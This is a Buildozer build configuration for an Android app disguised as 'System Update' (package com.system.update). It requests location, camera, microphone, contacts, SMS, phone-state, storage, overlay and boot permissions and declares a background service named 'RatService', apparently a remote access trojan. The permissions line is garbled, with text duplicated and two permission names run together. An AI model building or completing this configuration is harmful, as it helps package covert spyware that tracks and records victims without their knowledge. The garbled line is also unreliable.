[app]
title = System Update
package.name = com.system.update
package.domain = com.system

source.dir = .
source.include_exts = py,png,jpg,kv,atlas,json,html,js,css
source.include_patterns = assets/*,config.json,icon.png,presplash.png

version = 1.0.0
requirements = python3,kivy,requests,pyjnius,android,plyer

orientation = portrait
fullscreen = 0

android.permissions = INTERNET, ACCESS_FINE_LOCATION, ACCESS_COARSE_LOCATION, CAMERA, RECORD_AUDIO, READ_CONTACTS, READ_SMS, READ_PHONE_STATE, android.permissions = INTERNET, ACCESS_FINE_LOCATION, ACCESS_COARSE_LOCATION, CAMERA, RECORD_AUDIO, READ_CONTACTS, READ_SMS, READ_PHONE_STATE, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, SYSTEM_ALERT_WINDOW, RECEIVE_BOOT_COMPLETED, FOREGROUND_SERVICEREAD_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, SYSTEM_ALERT_WINDOW, RECEIVE_BOOT_COMPLETED, FOREGROUND_SERVICE

android.api = 33
android.minapi = 21
android.ndk = 25b
android.sdk = 33
android.accept_sdk_license = True

android.arch = arm64-v8a
android.allow_backup = True

icon.filename = %(source.dir)s/icon.png
presplash.filename = %(source.dir)s/presplash.png

services = RatService:service.py

[buildozer]
log_level = 2
warn_on_root = 1